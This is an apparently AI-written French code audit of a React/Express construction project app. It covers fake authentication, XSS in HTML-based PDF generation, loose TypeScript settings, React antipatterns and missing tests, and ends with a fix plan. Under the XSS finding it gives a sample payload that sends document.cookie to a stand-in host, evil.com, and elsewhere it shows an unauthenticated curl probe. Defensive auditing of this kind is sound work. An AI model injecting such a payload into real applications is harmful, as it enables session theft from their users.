# AUDIT PROFESSIONNEL - Chantier Pro Frontend

**Date** : 26/02/2026
**Auditeur** : Claude Opus 4.6 (Audit automatise)
**Scope** : Frontend React/TypeScript + interactions Backend Express
**Stack** : React 18, TypeScript 5.8, Vite 5, TanStack Query, Tailwind, shadcn/ui

---

## 1. SCORE GLOBAL

| Critere          | Note  |
|------------------|-------|
| **Note globale** | **3.5 / 10** |
| **Niveau de risque** | **CRITIQUE** |
| Maintenabilite   | 5 / 10 |
| Securite         | 1 / 10 |
| Scalabilite      | 3 / 10 |

**Verdict** : Cette application est un prototype/MVP qui ne peut en aucun cas etre mis en production en l'etat. L'authentification est entierement factice, la generation PDF est vulnerable au XSS, et le typage TypeScript est desactive. La structure de base (choix de stack, hooks TanStack Query, shadcn/ui) est correcte mais l'implementation presente des lacunes majeures.

---

## 2. FAILLES DE SECURITE

### SEC-01 : Authentification completement fictive [CRITIQUE]

**Fichiers** : `frontend/src/auth/AuthProvider.tsx:3-8`, `frontend/src/auth/AuthGuard.tsx`
**Serveur** : `server/src/middleware/auth.js`

L'authentification est un stub de developpement deploye tel quel :

```typescript
// AuthProvider.tsx - TOUJOURS authentifie, TOUJOURS le meme utilisateur
const DEV_USER = {
  id: 'dev-user-1',
  email: 'dev@chantier-pro.fr',
  name: 'Utilisateur Dev',
};
// isAuthenticated: true, isLoading: false - HARDCODED
```

```javascript
// server/middleware/auth.js - Aucune verification
export const authenticateToken = (req, res, next) => {
  req.user = DEV_USER;  // Injecte toujours le meme user
  next();               // Passe toujours
};
```

**Pourquoi c'est dangereux** : N'importe qui peut acceder a toutes les routes API sans aucune identification. Toutes les donnees de tous les projets sont accessibles publiquement. Les operations CRUD (creation, modification, suppression) sont disponibles pour tout visiteur anonyme.

**Exploitation** : `curl http://votre-domaine.com/api/organizations` retourne toutes les organisations sans authentification.

**Correction requise** : Implementer un vrai systeme d'auth (Auth0, NextAuth, ou JWT custom) avec :
- Verification des tokens dans le middleware
- Refresh tokens
- Session management
- Logout

---

### SEC-02 : XSS dans la generation PDF [CRITIQUE]

**Fichier** : `frontend/src/lib/pdf.ts` (927 lignes)

Toutes les fonctions PDF (`generatePaymentCertificatePDF`, `generateAcceptancePDF`, `generateProjectStatusPDF`, `generateSiteReportPDF`) construisent du HTML par interpolation de template literals avec des donnees utilisateur non echappees, puis injectent via `document.write()` :

```typescript
// pdf.ts:121-122 - Donnees non echappees injectees dans du HTML
<div class="project-info">${project.name}</div>
<div>${project.address}</div>

// pdf.ts:133 - company.name non echappe
<div style="font-size: 12pt; font-weight: bold;">${company.name}</div>

// pdf.ts:603 - description de decision non echappee
<div class="decision-desc">${d.description}</div>

// pdf.ts:905 - remarques generales non echappees
${report.generalRemarks || 'Neant.'}
```

**Exploitation** : Un utilisateur saisit comme nom de projet : `<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">`. Lors de la generation PDF, ce code s'execute dans la fenetre `window.open`.

**Correction recommandee** :
```typescript
const escapeHtml = (str: string): string => {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
};

// Utilisation dans les templates
<div class="project-info">${escapeHtml(project.name)}</div>
```

Idealement, migrer vers une lib PDF (jsPDF, @react-pdf/renderer) qui ne passe pas par `document.write()`.

---

### SEC-03 : API client sans headers d'authentification [HAUTE]

**Fichier** : `frontend/src/lib/api.ts:6-26`

```typescript
async function apiRequest<T>(endpoint: string, options: RequestInit = {}): Promise<T> {
  const headers: HeadersInit = {
    'Content-Type': 'application/json',
    ...options.headers,
  };
  // Aucun header Authorization, aucun cookie, aucun token
```

Les exports (`exportsApi`, lignes 146-165) contournent meme `apiRequest` et utilisent `fetch()` directement sans aucun header.

**Correction** : Ajouter un intercepteur d'auth :
```typescript
async function apiRequest<T>(endpoint: string, options: RequestInit = {}): Promise<T> {
  const token = await getAccessToken(); // depuis auth provider
  const headers: HeadersInit = {
    'Content-Type': 'application/json',
    ...(token && { Authorization: `Bearer ${token}` }),
    ...options.headers,
  };
```

---

### SEC-04 : `.env` probablement versionne [MOYENNE]

**Fichier** : `frontend/.env` (present dans le working tree, non dans .gitignore)

```
VITE_API_URL=http://localhost:3001/api
```

Actuellement inoffensif (juste une URL localhost), mais tout futur secret (cle API, client ID OAuth) serait expose.

**Correction** : Ajouter `.env` au `.gitignore`.

---

### SEC-05 : IDs non securises [MOYENNE]

**Fichier** : `frontend/src/lib/projects.ts:5-7`

```typescript
export const generateId = (): string => {
  return Math.random().toString(36).substring(2, 9) + Date.now().toString(36);
};
```

`Math.random()` n'est pas cryptographiquement sur. Les IDs sont partiellement predictibles.

**Correction** : Utiliser `crypto.randomUUID()` (natif dans les navigateurs modernes) ou laisser le serveur generer les IDs.

---

### SEC-06 : Pas de protection CSRF [MOYENNE]

Quand un vrai systeme d'auth sera en place (cookies), il n'y a aucune protection CSRF. CORS seul n'est pas suffisant.

---

### SEC-07 : Pas de Content Security Policy [BASSE]

**Fichier** : `frontend/index.html` - Aucun header CSP. Les PDFs generes ouvrent des fenetres sans CSP.

---

## 3. ANTIPATTERNS REACT

### REACT-01 : God Component `Index.tsx` [HAUTE]

**Fichier** : `frontend/src/pages/Index.tsx` (280 lignes)

Ce composant gere :
- L'etat de la vue (dashboard/create/detail)
- La selection de projet
- 7 handlers CRUD differents (decisions, companies, reports, snags, payments, planning)
- La logique de mise a jour du projet
- Le rendu conditionnel de 3 vues

**Correction** : Extraire vers un routeur ou au minimum un `useReducer` + custom hooks.

---

### REACT-02 : Routage par `useState` au lieu de React Router [HAUTE]

**Fichier** : `frontend/src/pages/Index.tsx:17-27`

```typescript
type ViewState = 'dashboard' | 'create' | 'detail';
const [view, setView] = useState<ViewState>('dashboard');
const [selectedProjectId, setSelectedProjectId] = useState<string | null>(null);
```

**Consequences** :
- Pas de deep linking (impossible de partager un lien vers un projet)
- Le bouton retour du navigateur ne fonctionne pas
- Perte d'etat au rafraichissement
- Pas d'URL lisible

**Correction** : Utiliser React Router avec des routes dediees :
```
/                       -> Dashboard
/projects/new           -> Wizard creation
/projects/:id           -> Detail projet
```

---

### REACT-03 : Props drilling excessif [MOYENNE]

**Fichier** : `frontend/src/components/ProjectDetail.tsx:31-41`

```typescript
interface ProjectDetailProps {
  project: Project;
  onBack: () => void;
  onDecisionAdded: (decision: Decision) => void;
  onCompanyAdded: (company: Company) => void;
  onReportAdded: (report: SiteReport) => void;
  onPlanningUpdated: (...) => void;
  onSnagAdded: (snag: Snag) => void;
  onSnagToggled: (snagId: string) => void;
  onPaymentAdded: (payment: PaymentApplication) => void;
}
```

9 props dont 8 callbacks. Chaque handler remonte `Index -> ProjectDetail -> Dialog -> handler -> API`.

**Correction** : Chaque sous-composant devrait appeler directement les mutations TanStack Query via ses propres hooks.

---

### REACT-04 : Calculs locaux client/serveur desynchronises [HAUTE]

**Fichier** : `frontend/src/pages/Index.tsx:89-101`

```typescript
const handleDecisionAdded = async (decision: Decision) => {
  if (!selectedProject) return;
  const updatedProject = addDecisionToProject(selectedProject, decision);
  // Calcule currentScore et currentRiskLevel LOCALEMENT
  // Puis envoie le resultat au serveur
  await handleProjectUpdate(selectedProject.id, {
    decisions: updatedProject.decisions,
    currentScore: updatedProject.currentScore,     // calcule cote client
    currentRiskLevel: updatedProject.currentRiskLevel, // calcule cote client
  });
};
```

Le score est calcule cote client et envoye au serveur comme donnee "de confiance". Un client modifie pourrait envoyer n'importe quel score. Le serveur devrait recalculer.

---

### REACT-05 : Aucun Error Boundary [MOYENNE]

Aucun `ErrorBoundary` dans l'arbre de composants. Une erreur dans n'importe quel composant enfant fait crasher toute l'application avec un ecran blanc.

---

### REACT-06 : `return null` silencieux [BASSE]

**Fichier** : `frontend/src/pages/Index.tsx:276`

```typescript
// Si view === 'detail' mais selectedProject est null -> ecran blanc silencieux
return null;
```

---

## 4. PROBLEMES TYPESCRIPT

### TS-01 : `strict: false` partout [CRITIQUE]

**Fichier** : `frontend/tsconfig.app.json:17-22`

```json
{
  "strict": false,
  "noUnusedLocals": false,
  "noUnusedParameters": false,
  "noImplicitAny": false,
  "noFallthroughCasesInSwitch": false
}
```

**Impact** : `strictNullChecks: false` signifie que `null` et `undefined` passent partout silencieusement. C'est la premiere cause de bugs runtime dans TypeScript.

**Correction** : Activer `strict: true` et corriger les erreurs de type.

---

### TS-02 : `any` massif dans le layer API [CRITIQUE]

**Fichier** : `frontend/src/lib/api.ts`

```typescript
getMe: () => apiRequest<{ user: any; organizations: any[] }>('/auth/me'),
list: () => apiRequest<{ organizations: any[] }>('/organizations'),
get: (id: string) => apiRequest<any>(`/organizations/${id}`),
update: (id: string, data: Partial<any>) => ...
create: (orgId: string, data: any) => ...
```

Plus de 20 occurrences de `any` dans ce seul fichier. La couche API est le point ou le typage est le plus critique (frontiere systeme) et c'est exactement la ou il est absent.

**Correction** : Utiliser les types definis dans `types/index.ts` :
```typescript
get: (id: string) => apiRequest<OrganizationWithStats>(`/organizations/${id}`),
create: (orgId: string, data: CreateProjectPayload) => apiRequest<Project>(...)
```

---

### TS-03 : Cast unsafe `as DecisionType` [BASSE]

**Fichier** : `frontend/src/components/AddDecisionDialog.tsx:98`

```typescript
<Select value={type} onValueChange={(v) => setType(v as DecisionType)}>
```

Pas de validation runtime que `v` est bien un `DecisionType` valide.

---

### TS-04 : Pas de types DTO pour les requetes/reponses API [MOYENNE]

Les types `Project`, `Organization` etc. sont utilises a la fois comme modeles domaine ET comme DTOs API. Il n'y a pas de types dedies `CreateProjectRequest`, `UpdateProjectRequest`, `ProjectResponse`.

---

## 5. CLEAN CODE / SOLID

### CC-01 : Violation du Single Responsibility Principle [HAUTE]

- `Index.tsx` : Routage + State + CRUD + Rendering (4 responsabilites)
- `pdf.ts` : 927 lignes de construction HTML inline (devrait etre une lib separee avec templates)
- `projects.ts` : Generation ID + formatage dates + calcul scores + persistence localStorage + CRUD helpers (5 responsabilites)

---

### CC-02 : Code mort [MOYENNE]

**Fichier** : `frontend/src/lib/projects.ts:149-205`

`loadProjects()` et `saveProjects()` sont des fonctions localStorage qui ne sont plus utilisees que par `migration.ts`. La migration est un script ponctuel, pas de la logique applicative.

**Fichier** : `frontend/src/components/App.css` - CSS boilerplate Vite jamais utilise (Tailwind le remplace).

---

### CC-03 : `console.error` en production [BASSE]

**Fichier** : `frontend/src/pages/NotFound.tsx`

```typescript
console.error("404: User attempted to access:", window.location.pathname);
```

---

### CC-04 : Nommage inconsistant [BASSE]

- `use-mobile.tsx` et `use-toast.ts` (kebab-case) vs `useProjects.ts` et `useDashboard.ts` (camelCase)
- Les hooks shadcn/ui sont dans `components/ui/` alors que les hooks custom sont dans `hooks/`

---

### CC-05 : Composant `ProjectDetail.tsx` trop volumineux [MOYENNE]

382 lignes avec du calcul financier inline, des calculs de planning, du rendu conditionnel complexe, et la gestion de 6 dialogs.

---

## 6. PERFORMANCE

### PERF-01 : Aucun code splitting [HAUTE]

**Fichier** : `frontend/src/App.tsx`

```typescript
import Index from "./pages/Index";
import NotFound from "./pages/NotFound";
// Import statique, tout est charge d'un bloc
```

Pour une app avec 51 composants UI, il n'y a pas de `React.lazy()` ni de `Suspense`. Le bundle initial charge tout, meme les composants jamais vus (carousel, menubar, command palette...).

---

### PERF-02 : Sur-invalidation des queries [MOYENNE]

**Fichier** : `frontend/src/hooks/useProjects.ts:60`

```typescript
onSuccess: (project, variables) => {
  queryClient.invalidateQueries({ queryKey: ['projects'] }); // TOUS les projets
```

Mettre a jour un champ d'un projet invalide le cache de tous les projets de toutes les organisations.

---

### PERF-03 : Composants shadcn/ui potentiellement inutiles [BASSE]

51 composants importes. Beaucoup ne semblent pas utilises dans le code (carousel, command, menubar, input-otp, hover-card...). Vite fait du tree-shaking mais les re-exports peuvent limiter son efficacite.

---

### PERF-04 : PDF generes par `document.write` + `window.open` [BASSE]

Methode bloquante et non-standard. Certains navigateurs bloquent `window.open()` par defaut (popup blocker).

---

## 7. TESTS

### Couverture estimee : < 10%

**Fichiers testes** :
- `scoring.ts` : Bonne couverture des fonctions de scoring (seul fichier bien teste)
- `ScoreDisplay`, `ProjectCard`, `NavLink`, `AddDecisionDialog`, `AuthGuard` : Tests de rendu basiques

**Fichiers NON testes** :
| Fichier | Criticite | Raison |
|---------|-----------|--------|
| `api.ts` | HAUTE | Couche API, aucun test |
| `projects.ts` | HAUTE | Logique metier principale |
| `finance.ts` | CRITIQUE | Calculs financiers en euros |
| `pdf.ts` | HAUTE | Generation de documents |
| `migration.ts` | MOYENNE | Migration de donnees |
| `Index.tsx` | HAUTE | Page principale, toute la logique |
| `ProjectDetail.tsx` | HAUTE | 382 lignes complexes |
| `ProjectCreationWizard.tsx` | HAUTE | Wizard multi-etapes |
| `OrganizationContext.tsx` | MOYENNE | State global |
| Hooks custom | HAUTE | useProjects, useOrganizations, useDashboard |

### Manques critiques :
- Les calculs financiers (`calculatePaymentDetails`, `getCompanyContractTotal`) ne sont pas testes alors qu'ils traitent des montants en euros
- Les calculs de score (`calculateInitialScore`, `calculateProjectScoreFromDecisions`) ne sont testes que partiellement
- Aucun test d'erreur API (network failure, 4xx, 5xx)
- Aucun test de race conditions sur les mutations
- Aucun test E2E (Playwright/Cypress absent des dependencies)

---

## 8. DETTE TECHNIQUE

| Element | Gravite |
|---------|---------|
| Auth fictive dupliquee front/back | Critique |
| 51 composants UI dont beaucoup inutiles | Moyenne |
| Code localStorage mort (`projects.ts`) | Basse |
| `App.css` boilerplate inutile | Basse |
| `lovable-tagger` dev dependency (non standard) | Basse |
| Pas de CI/CD visible | Haute |
| Pas de linting pre-commit (no husky/lint-staged) | Moyenne |
| Pas de Prettier configure | Basse |
| Nom du projet dans package.json : `vite_react_shadcn_ts` | Basse |
| Vite ecoute sur `::` (toutes interfaces) meme en dev | Basse |
| Serveur avec DB en memoire (perte a chaque restart) | Critique (si prod) |

---

## 9. PLAN D'AMELIORATION PRIORISE

### P0 - Bloquants production (Semaine 1-2)

| # | Action | Fichiers concernes |
|---|--------|--------------------|
| 1 | **Implementer l'authentification reelle** (Auth0/JWT/session) | `AuthProvider.tsx`, `AuthGuard.tsx`, `api.ts`, `server/middleware/auth.js`, `server/routes/auth.js` |
| 2 | **Corriger la faille XSS dans pdf.ts** (echapper les donnees ou migrer vers @react-pdf/renderer) | `src/lib/pdf.ts` |
| 3 | **Activer `strict: true` dans tsconfig** | `tsconfig.app.json`, `tsconfig.json` |
| 4 | **Typer la couche API** (remplacer tous les `any`) | `src/lib/api.ts` |

### P1 - Fondamentaux architecture (Semaine 2-4)

| # | Action | Fichiers concernes |
|---|--------|--------------------|
| 5 | **Implementer un vrai routing** (React Router avec routes /projects/:id) | `App.tsx`, `Index.tsx`, nouveau dossier `pages/` |
| 6 | **Deplacer les calculs metier cote serveur** (score, risk level) | `Index.tsx`, `server/routes/projects.js` |
| 7 | **Ajouter des Error Boundaries** | Nouveau composant `ErrorBoundary.tsx`, `App.tsx` |
| 8 | **Tester les calculs financiers** | Nouveaux fichiers `__tests__/finance.test.ts`, `__tests__/projects.test.ts` |

### P2 - Quick Wins (en parallele)

| # | Action |
|---|--------|
| 9 | Ajouter `.env` a `.gitignore` |
| 10 | Remplacer `generateId()` par `crypto.randomUUID()` |
| 11 | Supprimer le code mort (`App.css`, fonctions localStorage inutilisees) |
| 12 | Renommer le package : `vite_react_shadcn_ts` -> `chantier-pro` |
| 13 | Ajouter un pre-commit hook (husky + lint-staged) |

### P3 - Refactoring strategique (Mois 2)

| # | Action |
|---|--------|
| 14 | Decouper `Index.tsx` - Extraire les handlers vers des hooks dedies |
| 15 | Refactorer `pdf.ts` - Migrer vers @react-pdf/renderer ou puppeteer cote serveur |
| 16 | Eliminer le props drilling - Chaque composant appelle ses propres mutations TanStack Query |
| 17 | Ajouter du lazy loading (`React.lazy` pour les routes et les dialogs) |

### P4 - Ameliorations long terme (Mois 3+)

| # | Action |
|---|--------|
| 18 | Tests E2E avec Playwright sur les parcours critiques |
| 19 | CI/CD pipeline avec tests, lint, build, deploy |
| 20 | Audit de bundle pour identifier les composants shadcn/ui inutilises |
| 21 | Migrer la DB serveur de in-memory vers PostgreSQL |
| 22 | Ajouter CSP headers et rate limiting |

---

## Criteres de verification post-correction

1. **Securite** : `curl` sans token vers `/api/organizations` -> retourne 401
2. **XSS** : Creer un projet avec `<script>alert(1)</script>` dans le nom -> generer un PDF -> pas d'execution JS
3. **TypeScript** : `npx tsc --noEmit` ne retourne aucune erreur avec `strict: true`
4. **Tests** : `npx vitest run --coverage` avec couverture > 60% sur la logique metier
5. **Routing** : Ouvrir `/projects/xyz` directement -> affiche le projet (pas un ecran blanc)
6. **Auth** : Deconnexion -> tentative d'acces a une page protegee -> redirection vers login
